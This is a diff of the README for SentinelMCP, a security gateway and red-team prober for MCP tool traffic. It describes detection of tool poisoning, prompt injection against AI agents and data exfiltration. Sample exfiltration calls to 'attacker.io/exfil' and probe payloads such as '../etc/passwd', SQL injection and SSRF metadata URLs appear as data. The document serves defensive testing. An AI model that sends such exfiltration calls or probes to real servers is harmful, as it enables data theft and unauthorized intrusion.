@@ -6,76 +6,198 @@
 
 **Every tool, verified.**
 
-Real-time security gateway for MCP (Model Context Protocol) connections.
-Detects tool poisoning, rug pulls, credential theft, and semantic mosaic attacks
-in under 5ms — before your AI agent acts on them.
+SentinelMCP is a zero-trust security gateway for MCP (Model Context Protocol) connections.
+It sits between your AI agent and the MCP servers it talks to, and inspects every schema,
+parameter, output, and context window in real time — catching tool poisoning, rug pulls,
+credential theft, prompt injection, and semantic-mosaic attacks in **under 5 ms**, before
+your agent acts on them.
+
+It works two ways:
+
+- **Inline (defense)** — proxy live agent↔server traffic and block attacks as they happen.
+- **Offensive (discovery)** — actively probe *any* MCP server or agent you point it at and
+  produce a red-team vulnerability report. This is how you use SentinelMCP to **find bugs in
+  other people's servers and agents** — see [Find bugs in other servers & agents](#find-bugs-in-other-servers--agents).
 
 > **InjecAgent Benchmark:** 69.4% detection rate (43/62 cases) · avg 0.147 ms/check · [full scorecard](benchmarks/results/injecagent.md)
 
 ---
 
-## What it catches
+## Table of contents
 
-| Attack | Layer | How |
-|---|---|---|
-| Tool poisoning | 1 — Schema | Regex scan of tool descriptions on first connect |
-| Rug pulls | 1 — Schema | SHA-256 hash-watch, background re-validation every 5 min |
-| Bad parameters | 2 — Param | Strict JSON Schema validation, <1ms, no I/O |
-| Output injection | 3 — Output | Async pattern scan, circuit breaker on next call |
-| Semantic mosaic | 4 — Context | TF-IDF sliding window, fires at risk_score > 0.75 |
+- [What it catches](#what-it-catches)
+- [How it works — the 4-layer engine](#how-it-works--the-4-layer-engine)
+- [Everything in the box](#everything-in-the-box)
+- [Find bugs in other servers & agents](#find-bugs-in-other-servers--agents)
+- [Quick start — run the CISO demo](#quick-start--run-the-ciso-demo)
+- [How someone tests it (step by step)](#how-someone-tests-it-step-by-step)
+- [The four ways to integrate](#the-four-ways-to-integrate)
+- [Python SDK](#python-sdk)
+- [API reference](#api-reference)
+- [Configuration](#configuration)
+- [Run tests](#run-tests)
+- [Project structure](#project-structure)
+- [Build status](#build-status)
 
 ---
 
-## Run the CISO demo
+## What it catches
 
-This is the demo you run for every design partner conversation.
-Everything runs in Docker — no local Redis, no local Postgres, no setup beyond Docker Desktop.
+| Attack | OWASP | Layer | How |
+|---|---|---|---|
+| Tool poisoning (hidden instructions in tool descriptions) | LLM01 | 1 — Schema | Regex + policy scan of tool descriptions on first connect |
+| Rug pulls (schema silently changed mid-session) | LLM05 | 1 — Schema | SHA-256 hash-watch + background re-validation every 5 min |
+| Shadow / unauthorized MCP servers | LLM05 | 0 — Allowlist | Proxy rejects any target not on the server allowlist |
+| Encoded / obfuscated injection (base64, unicode-escape) | LLM01 | 1 + 3 | Decode-then-scan of descriptions and outputs |
+| Bad / smuggled parameters, privilege escalation | LLM08 | 2 — Param | Strict JSON-Schema validation + dangerous-arg scan, <1 ms, no I/O |
+| Output injection & PII/credential exfiltration | LLM02/LLM06 | 3 — Output | Async pattern scan; circuit breaker trips the **next** call |
+| Semantic mosaic (benign calls assembling sensitive data) | LLM08 | 4 — Context | TF-IDF sliding window; fires at risk_score > 0.75 |
+| Grey-zone / novel attacks | — | 4 — Context | Optional LLM semantic analysis (Ollama-first, Anthropic fallback) |
+| Known-bad tools & indicators | LLM05 | 1 — Registry | Match against the SMCP threat registry (CVE-style advisories) |
 
-### Prerequisites
+---
 
-- [Docker Desktop](https://www.docker.com/products/docker-desktop/) installed and running
-- Python 3.9+ (only for the demo script itself)
+## How it works — the 4-layer engine
+
+One-time schema validation is broken; per-request validation is too slow. SentinelMCP uses a
+hybrid where each layer runs only where it's cheap enough to run every time:
+
+| Layer | When it runs | Latency | Catches |
+|---|---|---|---|
+| **L1 Schema** | Discovery + hash-watch (cached) | ~0 ms on cache hit | Poisoning, rug pulls, known-bad tools |
+| **L2 Param** | Every call, **blocking** | <1 ms | Smuggling, privilege escalation, dangerous args |
+| **L3 Output** | Every call, **async** (Celery) | 0 ms blocking | Output injection, PII/secret leakage |
+| **L4 Context** | Every call, **parallel** | <3 ms | Semantic mosaic, cross-call data assembly |
+
+**The async-output trick:** the agent gets its response immediately; a copy is forked to the
+inspector via Celery. If a threat is found, the **circuit breaker** blocks the *next* call in
+that session — full output coverage with zero added latency on the response path.
+
+Layer 1 cache records are signed with **HMAC-SHA256 attestation**, so a tampered cache entry is
+detected and dropped on read.
+
+---
+
+## Everything in the box
+
+**Detection & policy**
+- 4-layer detection engine (schema · param · output · context) + Layer-0 allowlist
+- 36+ built-in injection/PII/dangerous-action patterns covering OWASP LLM Top 10
+- Encoded-injection decoder (base64 + unicode escapes)
+- Hot-reloadable **policy-as-code** engine (`policies/default.yaml`) — add rules without redeploy
+- **SMCP threat registry** (`registry/known_bad.json`) — CVE-style advisories with severity + OWASP mapping, queryable over the API
+- Optional **LLM semantic analysis** for the grey zone (Ollama-first, Anthropic fallback)
+
+**Gateway modes**
+- **Transparent MCP proxy** (`/proxy`) — drop-in JSON-RPC interception with per-layer latency headers
+- **Pre-flight analyzer** (`/proxy/analyze`) — get a full threat report on a *planned* session before executing anything
+- **Active probe / pentester** (`/probe`) — 7 red-team attacks against any target MCP server
+- **REST & A2A adapters** (`/adapters/*`) — wrap a plain REST/OpenAPI service or an agent-to-agent endpoint and gate it through the same engine
+
+**Enterprise & ops**
+- Per-tenant **API keys** (`X-Sentinel-Key`) + **JWT/JWKS** for the dashboard, with tenant isolation
+- Rate limiting (slowapi) on every route; per-session **circuit breaker**
+- **PostgreSQL append-only audit log** with tenant scoping; CSV export
+- **Compliance reports** (PCI DSS + SOC 2 + OWASP) as JSON and print-ready HTML
+- **Alerts** to Slack / PagerDuty / generic webhooks
+- **OpenTelemetry** tracing (Jaeger), **Grafana** dashboards, high-availability profile (Redis Sentinel + Postgres replica)
+
+**Clients & UIs**
+- **Python SDK** (`sentinelmcp_sdk`) — sync + async, plus middleware
+- **VS Code extension** (`extension/`, packaged `.vsix`) — inline threat surfacing in the editor
+- **React dashboard** (`dashboard/`) — live threat feed; **Admin UI** (`admin/`) with a Test Lab
+- **SentinelMCP-as-an-MCP-server** (`demo/sentinel_mcp_server.py`) — expose the scanners *as* MCP tools an agent can call, and a **LangGraph research agent** that uses them
+
+---
+
+## Find bugs in other servers & agents
+
+Yes — this is a first-class use case, and it's already built. There are three ways to point
+SentinelMCP at *someone else's* MCP server or agent and get findings back.
+
+### 1. Active probe — red-team pentest (`POST /probe`)
+
+Runs live attacks against a target MCP server and returns a scored vulnerability report. Seven
+probes today, each mapped to OWASP LLM Top 10:
+
+| Probe | OWASP | What it does |
+|---|---|---|
+| `prompt_injection` | LLM01 | Scans tool descriptions for injected instructions |
+| `rug_pull` | LLM05 | Calls `tools/list` twice, diffs the schema hash |
+| `pii_leak` | LLM06 | Calls tools with empty args, scans responses for PII |
+| `sql_injection` | LLM07 | Sends SQL payloads, watches for DB error leakage |
+| `path_traversal` | LLM07 | Sends `../etc/passwd`, checks for file-content leakage |
+| `ssrf` | LLM07 | Sends cloud-metadata URLs, checks if the server fetches them |
+| `dos` | LLM04 | Sends a 100 KB payload, measures latency amplification |
 
 ```bash
-# Clone and install the demo script's only dependency
+# Probe any MCP server for all 7 vulnerability classes
+curl -X POST http://localhost:8888/probe \
+  -H "X-Sentinel-Key: dev-key-123" \
+  -H "Content-Type: application/json" \
+  -d '{"server_url":"http://target-mcp-server:8001","attacks":["all"]}'
+
+# or, if the stack is up:  make probe SERVER=http://target-mcp-server:8001
+```
+
+You get back a `risk_score` (0–10), a `risk_level` (SAFE→CRITICAL), and per-attack findings with
+severity, evidence, and remediation. Rate-limited to 5/min because probing is expensive.
+
+### 2. Pre-flight analysis — vet an agent's plan (`POST /proxy/analyze`)
+
+Given a target server and a list of tool calls an agent *intends* to make, this fetches the
+server's real tool list, runs L1 schema validation, then dry-runs every planned call through
+L2 + L4 — returning a PASS/BLOCK verdict per call **without executing anything**. Use it to
+audit an agent's behavior before it runs.
+
+```bash
+curl -X POST http://localhost:8888/proxy/analyze \
+  -H "X-Sentinel-Key: dev-key-123" -H "Content-Type: application/json" \
+  -d '{
+    "server_url": "http://target-mcp-server:8001",
+    "prompt": "summarize customer records",
+    "tool_calls": [
+      {"name": "query_database", "arguments": {"query": "SELECT * FROM users"}},
+      {"name": "http_post", "arguments": {"url": "https://attacker.io/exfil"}}
+    ]
+  }'
+```
+
+### 3. Inline proxy — catch bugs in production traffic (`POST /proxy`)
+
+Point the agent's MCP client at SentinelMCP and set `X-MCP-Target` to the real server. Every
+JSON-RPC message is inspected; threats are logged to the audit trail and blocked, and the
+response carries an `X-Sentinel-Latency` header with per-layer timing. This surfaces bugs and
+attacks in *live* agent↔server traffic.
+
+> **Extending the probe set:** each probe is a small async function in
+> [app/gateway/probe_router.py](app/gateway/probe_router.py) registered in the `_PROBE_FNS`
+> dispatch table. Adding a new attack class (e.g. command injection, auth bypass, tool-shadowing)
+> is a matter of writing one function and adding a dispatch entry — a natural next extension.
+
+---
+
+## Quick start — run the CISO demo
+
+Everything runs in Docker — no local Redis, no local Postgres.
+
+**Prerequisites:** [Docker Desktop](https://www.docker.com/products/docker-desktop/) running, and Python 3.9+ for the demo script.
+
+```bash
 git clone https://github.com/saratala/sentinelmcp
 cd sentinelmcp
-pip install httpx
-```
+pip install httpx            # the demo script's only dependency
 
-### Step 1 — Start everything
-
-```bash
-# Start the full stack: redis + postgres + api + celery worker
+# Start the full stack (redis + postgres + api + worker) and the demo MCP servers
 docker-compose up -d
-
-# Start the demo MCP servers (clean + poisoned)
 docker-compose --profile demo up -d
-```
 
-Wait ~10 seconds for services to be healthy, then verify:
+# Wait ~10s, then verify
+curl http://localhost:8888/health          # {"status":"ok","version":"0.2.0",...}
 
-```bash
-curl http://localhost:8888/health
-# {"status":"ok","version":"0.2.0"}
-```
-
-### Step 2 — Run the demo
-
-```bash
+# Run the 3-scenario demo: clean server passes, poisoned server is intercepted, rug pull is caught
 python demo/demo.py
 ```
-
-### Step 3 — Open the threat dashboard
-
-```
-http://localhost:3000
-login: admin / sentinel
-```
-
-The dashboard auto-refreshes every 10 seconds. Run the demo script a few times
-to populate it with threat events — you'll see the live threat feed, attack
-timeline, threat-by-type breakdown, and top attacked servers.
 
 **Expected output:**
 
@@ -83,96 +205,213 @@ timeline, threat-by-type breakdown, and top attacked servers.
 ──────────────────────────────────────────────────────────────────
   Step 1 — Clean MCP Server
 ──────────────────────────────────────────────────────────────────
-  ✓  PASSED — all 4 tools verified clean
-  Latency : 3.2ms  (gateway overhead)
+  ✓  PASSED — all 4 tools verified clean          Latency: 3.2ms
 
-──────────────────────────────────────────────────────────────────
   Step 2 — Poisoned MCP Server (CVE-2025-54136)
-──────────────────────────────────────────────────────────────────
   🚨  ATTACK INTERCEPTED — 2 threat(s) detected
-  Threat    : TOOL_POISONING
-  Pattern   : exfiltration_url
-  Match     : "export all rows to https://attacker.io/exfil"
-  Confidence: 95%
+  Threat: TOOL_POISONING · Pattern: exfiltration_url · Confidence: 95%
 
-──────────────────────────────────────────────────────────────────
   Step 3 — Rug Pull Detection
-──────────────────────────────────────────────────────────────────
   ✓  Initial validation passed — schema cached
   🚨  RUG PULL DETECTED — schema changed mid-session
 ```
 
-### Quick health check
+### The UIs
 
-```bash
-curl http://localhost:8888/health
-# {"status":"ok","version":"0.2.0"}
+| URL | What | Login |
+|---|---|---|
+| http://localhost:8888/docs | Interactive API (Swagger) | `X-Sentinel-Key: dev-key-123` |
+| http://localhost:5173 | React live threat dashboard | — |
+| http://localhost:3000 | Grafana dashboards | `admin` / `sentinel` |
+| http://localhost:9000 | Admin UI + Test Lab (`make admin`) | — |
 
-curl http://localhost:8888/gateway/inventory
-# lists all monitored servers and their security status
-```
+**Tear down:** `docker-compose --profile demo down` then `docker-compose down -v`.
 
 ---
 
-## Tear down
+## How someone tests it (step by step)
+
+A new person evaluating SentinelMCP should follow this path — it goes from "is it alive" to
+"I broke into a server with it" in about ten minutes.
+
+**0. Clone & choose a lane.** Docker is the fastest path; a local venv is enough for tests only.
 
 ```bash
-docker-compose --profile demo down
-docker-compose down -v   # -v removes the postgres data volume too
+git clone https://github.com/saratala/sentinelmcp && cd sentinelmcp
 ```
+
+**1. Run the test suite (no Docker needed).** Proves the detection logic works in isolation —
+uses `fakeredis`, so no external services.
+
+```bash
+python -m venv .venv && source .venv/bin/activate
+pip install -e ".[test]"
+PYTHONPATH=. pytest tests/ -v            # 108 tests, all 4 layers + auth + proxy
+```
+
+**2. Bring up the stack.**
+
+```bash
+docker-compose up -d && docker-compose --profile demo up -d
+curl http://localhost:8888/health
+```
+
+**3. Watch it catch a live attack.** Run the scripted demo, then open the dashboard at
+http://localhost:5173 and re-run it a few times to populate the feed.
+
+```bash
+python demo/demo.py
+```
+
+**4. Point it at a server and hunt for bugs.** The two demo servers are on ports 8001 (clean)
+and 8002 (poisoned) — probe both and compare the reports.
+
+```bash
+make probe SERVER=http://localhost:8002     # poisoned → CRITICAL findings
+make probe SERVER=http://localhost:8001     # clean → SAFE
+make attacks                                # list the 7 probe types
+```
+
+**5. Vet a planned agent session** with `/proxy/analyze` (see the example above), or route real
+traffic through `/proxy` with an `X-MCP-Target` header.
+
+**6. Pull the compliance evidence.**
+
+```bash
+make report            # PCI DSS + SOC 2 + OWASP summary (JSON)
+make threats           # recent audit-log events
+make stats             # counts by threat type and layer
+# print-ready PDF:  open http://localhost:8888/gateway/compliance/report.html
+```
+
+**7. (Optional) Try the SDK, the VS Code extension, or SentinelMCP-as-an-MCP-server**
+(`make mcp-server`, `make agent`).
+
+> **Auth note:** every gateway route requires an API key. The dev default is `dev-key-123`
+> (header `X-Sentinel-Key`). `/health`, `/probe/attacks`, and `/auth/*` are open.
+
+---
+
+## The four ways to integrate
+
+1. **Transparent proxy** — zero code change to the server; agent points its MCP client at
+   SentinelMCP with `X-MCP-Target`. Best for production defense.
+2. **SDK / API calls** — call `/proxy/analyze` or `/probe` from your own code or CI. Best for
+   pre-deploy vetting and continuous scanning.
+3. **REST / A2A adapters** — register a plain REST+OpenAPI service or an agent-to-agent endpoint
+   (`/adapters/rest/register`, `/adapters/a2a/register`) and gate its calls through the engine.
+4. **SentinelMCP-as-an-MCP-server** — expose the scanners themselves as MCP tools so an agent
+   (e.g. the included LangGraph research agent) can invoke security checks as part of its plan.
+
+---
+
+## Python SDK
+
+```python
+from sentinelmcp_sdk import SentinelClient
+
+sentinel = SentinelClient(api_key="dev-key-123", gateway_url="http://localhost:8888")
+
+# Pre-flight: is this planned session safe?
+result = sentinel.analyze(
+    "http://target-mcp-server:8001",
+    tool_calls=[{"name": "query_db", "arguments": {"query": "SELECT *"}}],
+)
+if result.is_blocked:
+    raise RuntimeError(f"Blocked: {result.threats}")
+
+# Red-team a server
+report = sentinel.probe("http://target-mcp-server:8001", attacks=["all"])
+print(report["risk_level"], report["vulnerabilities_found"])
+
+# Compliance + audit
+print(sentinel.report(days=30))
+print(sentinel.threats(days=7))
+```
+
+An async client (`AsyncSentinelClient`) and drop-in agent middleware are also available.
+
+---
+
+## API reference
+
+All routes require `X-Sentinel-Key` unless noted.
+
+**Gateway (L1–L4)** — `app/gateway/router.py`
+| Method | Path | Purpose |
+|---|---|---|
+| `GET` | `/health` | Liveness + per-layer latency *(open)* |
+| `POST` | `/gateway/validate-schema` | L1 — validate & cache a server's tool schemas |
+| `POST` | `/gateway/invoke` | L2+L3+L4 — validate a single tool invocation |
+| `POST` | `/gateway/l4/evaluate` | Feed a call sequence straight into L4 (Test Lab) |
+| `GET` | `/gateway/inventory` | All monitored servers + cached security status |
+| `POST` | `/gateway/circuit-breaker/reset` | Unblock a session after review |
+
+**Proxy & analysis** — `app/gateway/proxy_router.py`
+| Method | Path | Purpose |
+|---|---|---|
+| `POST` | `/proxy` | Transparent MCP JSON-RPC proxy (`X-MCP-Target`) |
+| `POST` | `/proxy/analyze` | Pre-flight threat report for a planned session |
+| `GET/POST/DELETE` | `/allowlist` | Manage the approved-server allowlist (anti-shadow-MCP) |
+
+**Active probe** — `app/gateway/probe_router.py`
+| Method | Path | Purpose |
+|---|---|---|
+| `POST` | `/probe` | Run red-team attacks against a target server |
+| `GET` | `/probe/attacks` | List available attacks + OWASP mappings *(open)* |
+
+**Registry, threats & compliance** — `app/gateway/router.py`
+| Method | Path | Purpose |
+|---|---|---|
+| `GET` | `/gateway/registry`, `/gateway/registry/{smcp_id}` | Browse SMCP threat advisories |
+| `POST` | `/gateway/registry/check` | Pre-screen tool names/text against known-bad registry |
+| `GET` | `/gateway/threats` | Paginated audit log (filter by server/type/since) |
+| `GET` | `/gateway/threats/stats` | Aggregate counts by type & layer |
+| `GET` | `/gateway/threats/export` | CSV export for compliance |
+| `GET` | `/gateway/compliance/report[.html]` | PCI DSS / SOC 2 / OWASP report |
+
+**Keys, auth & adapters** — `keys_router.py` · `auth_router.py` · `adapters_router.py`
+| Method | Path | Purpose |
+|---|---|---|
+| `POST/GET/DELETE` | `/keys` | Per-tenant API key management |
+| `GET` | `/keys/policy` | Current key/rate-limit policy |
+| `GET` | `/auth/jwks`, `/auth/status` | JWKS + auth mode *(open)* |
+| `POST/GET/DELETE` | `/adapters/rest/*` | Register/gate REST+OpenAPI services |
+| `POST/GET` | `/adapters/a2a/*` | Register/gate agent-to-agent endpoints |
+
+Full interactive docs at `http://localhost:8888/docs`.
+
+---
+
+## Configuration
+
+All config is environment-driven (pydantic-settings). Copy `.env.example` → `.env`. Key vars:
+
+| Var | Default | Purpose |
+|---|---|---|
+| `SENTINEL_API_KEY` | `dev-key-123` | Dev API key for `X-Sentinel-Key` |
+| `REDIS_URL` | `redis://localhost:6379` | Cache + circuit breaker + context store |
+| `DATABASE_URL` | postgres… | Audit log |
+| `SCHEMA_CACHE_TTL` | `300` | L1 cache TTL (s) |
+| `REVALIDATION_INTERVAL` | `300` | Background rug-pull re-scan interval (s) |
+| `SCHEMA_SIGNING_SECRET` | — | HMAC key for cache attestation |
+| `LLM_ANALYSIS_ENABLED` | `false` | Turn on L4 LLM grey-zone analysis |
+| `LLM_PROVIDER` / `OLLAMA_URL` / `ANTHROPIC_API_KEY` | — | LLM backend for L4 |
+| `SLACK_WEBHOOK_URL` / `PAGERDUTY_ROUTING_KEY` | — | Alert sinks |
+| `SENTINEL_OTEL_ENDPOINT` | — | OpenTelemetry/Jaeger export |
 
 ---
 
 ## Run tests
 
 ```bash
-# One-time setup
 python -m venv .venv && source .venv/bin/activate
 pip install -e ".[test]"
-
-# Run (no Redis or Postgres needed — tests use fakeredis)
 PYTHONPATH=. pytest tests/ -v --cov=app --cov-report=term-missing
 ```
 
-71 tests across all layers, fakeredis — no external services needed.
-
----
-
-## API endpoints
-
-| Method | Path | What it does |
-|---|---|---|
-| `GET` | `/health` | Liveness check |
-| `POST` | `/gateway/validate-schema` | Layer 1 — validate + cache tool schemas |
-| `POST` | `/gateway/invoke` | Layers 2+3+4 — validate a tool invocation |
-| `GET` | `/gateway/inventory` | All monitored servers + security status |
-| `POST` | `/gateway/circuit-breaker/reset` | Unblock a session after admin review |
-
-### Validate a server's schemas
-
-```bash
-curl -X POST http://localhost:8888/gateway/validate-schema \
-  -H "Content-Type: application/json" \
-  -d @tests/fixtures/poisoned_tools.json
-```
-
-### Invoke a tool through the gateway
-
-```bash
-curl -X POST http://localhost:8888/gateway/invoke \
-  -H "Content-Type: application/json" \
-  -d '{
-    "session_id": "agent-session-001",
-    "server_url": "https://my-mcp-server.com",
-    "tool_name": "query_database",
-    "params": {"query": "SELECT * FROM users"},
-    "input_schema": {
-      "type": "object",
-      "properties": {"query": {"type": "string"}},
-      "required": ["query"]
-    }
-  }'
-```
+108 tests across all layers (schema, param, output, context), auth, OWASP patterns, and the
+proxy — all use `fakeredis`, so no Redis or Postgres is required.
 
 ---
 
@@ -181,46 +420,55 @@ curl -X POST http://localhost:8888/gateway/invoke \
 ```
 sentinelmcp/
 ├── app/
-│   ├── main.py              # FastAPI app entry point
-│   ├── config.py            # All config via env vars (pydantic-settings)
-│   ├── deps.py              # FastAPI dependency injectors
+│   ├── main.py                 # FastAPI app, lifespan, middleware, /health
+│   ├── config.py · deps.py     # Settings + dependency injectors
 │   ├── gateway/
-│   │   ├── schema_layer.py  # Layer 1: schema cache + rug pull
-│   │   ├── param_layer.py   # Layer 2: parameter validation
-│   │   ├── output_layer.py  # Layer 3: async output inspection
-│   │   ├── context_layer.py # Layer 4: TF-IDF semantic mosaic
-│   │   ├── validator.py     # Orchestrates Layers 2+3+4
-│   │   └── router.py        # /gateway/* endpoints
-│   ├── core/
-│   │   ├── redis.py         # Redis connection pool
-│   │   └── circuit_breaker.py # Per-session circuit breaker
-│   └── models/
-│       └── schemas.py       # All Pydantic v2 models
-├── worker/
-│   └── tasks.py             # Celery async output inspection task
-├── demo/
-│   ├── demo.py              # CISO demo script (3 scenarios)
-│   ├── clean_server.py      # Legitimate MCP server (port 8001)
-│   └── poisoned_server.py   # Attack simulation server (port 8002)
-├── tests/                   # 61 tests, all 4 layers
-├── docker-compose.yml
-├── Dockerfile
-└── SKILL.md                 # Authoritative project context
+│   │   ├── schema_layer.py      # L1: cache + hash-watch + rug pull + attestation
+│   │   ├── param_layer.py       # L2: JSON-Schema + dangerous-arg validation
+│   │   ├── output_layer.py      # L3: async output inspection
+│   │   ├── context_layer.py     # L4: TF-IDF semantic mosaic (+ optional LLM)
+│   │   ├── validator.py         # Orchestrates L2+L3+L4
+│   │   ├── proxy.py             # Transparent MCP proxy core
+│   │   ├── router.py            # /gateway/* (validate, invoke, threats, compliance)
+│   │   ├── proxy_router.py      # /proxy, /proxy/analyze, /allowlist
+│   │   ├── probe_router.py      # /probe active red-team scanner
+│   │   ├── adapters_router.py   # /adapters REST + A2A
+│   │   ├── keys_router.py · auth_router.py
+│   ├── detection/patterns.py   # 36+ injection/PII/dangerous patterns + decoders
+│   ├── core/                    # redis, circuit_breaker, policy_engine, registry,
+│   │                            #   allowlist, auth, keys, rate_limit, alerts,
+│   │                            #   threat_log, llm_analyzer, telemetry, database
+│   └── models/                  # Pydantic v2 schemas + SQLAlchemy ORM
+├── worker/tasks.py             # Celery async output inspection
+├── demo/                       # demo.py, clean/poisoned servers, MCP server, LangGraph agent
+├── benchmarks/                 # InjecAgent runner + scorecards
+├── registry/known_bad.json     # SMCP threat registry
+├── policies/default.yaml       # Policy-as-code rules
+├── sentinelmcp_sdk/            # Python SDK (sync + async + middleware)
+├── extension/                  # VS Code extension (packaged .vsix)
+├── dashboard/ · admin/         # React threat feed + Admin UI/Test Lab
+├── grafana/ · helm/            # Dashboards + Kubernetes chart
+├── docker-compose.yml · Dockerfile · Makefile · pyproject.toml
+└── SKILL.md                    # Authoritative project context
 ```
 
 ---
 
 ## Build status
 
-- [x] Layer 1: Schema cache + rug pull detection
-- [x] Layer 2: Parameter validation
-- [x] Layer 3: Async output inspection + circuit breaker
-- [x] Layer 4: Context accumulation + semantic mosaic
-- [x] Production FastAPI app
-- [x] Docker + Celery worker
-- [x] CISO demo (3 scenarios, one command)
-- [ ] Auth (X-Sentinel-Key) + rate limiting
-- [ ] PostgreSQL threat log
-- [ ] SIEM integrations (Splunk + Datadog)
-- [ ] Dashboard (React)
-- [ ] Helm chart (enterprise deployment)
+- [x] L1 Schema — cache + rug pull + HMAC attestation + known-bad registry
+- [x] L2 Param — JSON-Schema + dangerous-arg validation
+- [x] L3 Output — async inspection + circuit breaker
+- [x] L4 Context — TF-IDF semantic mosaic + optional LLM grey-zone analysis
+- [x] Transparent proxy + pre-flight analyzer + server allowlist
+- [x] Active probe (7 red-team attacks, OWASP-mapped)
+- [x] Policy-as-code engine + SMCP threat registry
+- [x] Auth (API key + JWT/JWKS), rate limiting, per-tenant isolation
+- [x] PostgreSQL audit log + CSV export + PCI/SOC2/OWASP compliance reports
+- [x] Alerts (Slack/PagerDuty/webhook), OpenTelemetry, Grafana, HA profile
+- [x] Python SDK, VS Code extension, React dashboard + Admin UI
+- [x] REST + A2A adapters
+- [x] InjecAgent benchmark harness (69.4% detection)
+- [ ] Managed cloud / Railway live demo URL
+- [ ] SOC 2 Type II (Vanta) — in progress
+- [ ] Expanded probe set (command injection, auth bypass, tool-shadowing)
